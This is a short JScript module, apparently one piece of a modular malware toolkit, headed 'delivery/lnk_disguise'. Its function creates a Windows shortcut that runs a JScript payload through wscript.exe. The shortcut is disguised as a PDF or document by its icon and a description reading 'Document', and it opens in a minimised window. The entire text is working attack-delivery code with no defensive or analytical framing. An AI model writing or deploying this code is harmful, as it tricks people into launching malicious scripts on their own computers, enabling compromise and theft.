// chunk: delivery/lnk_disguise
// depends: core/run_cmd
// provides: create_lnk
// format: jscript
// description: Creates an LNK shortcut that runs the JScript payload disguised as a PDF/document

function create_lnk(jsPath, lnkPath, iconPath) {
    var s = WScript.CreateObject("WScript.Shell");
    var lnk = s.CreateShortcut(lnkPath);
    lnk.TargetPath = "wscript.exe";
    lnk.Arguments = '"' + jsPath + '"';
    lnk.IconLocation = iconPath || "shell32.dll,1";
    lnk.Description = "Document";
    lnk.WindowStyle = 7;
    lnk.Save();
}
